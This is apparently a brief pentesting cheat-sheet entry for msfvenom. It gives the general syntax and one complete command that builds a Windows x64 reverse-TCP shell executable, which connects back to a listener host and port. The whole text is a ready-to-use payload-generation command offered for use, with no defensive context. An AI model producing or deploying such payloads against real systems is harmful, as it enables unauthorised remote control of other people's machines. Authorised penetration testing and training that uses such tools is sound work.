# msfvenom

msfvenom -p <PAYLOAD> <OPTIONS>

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

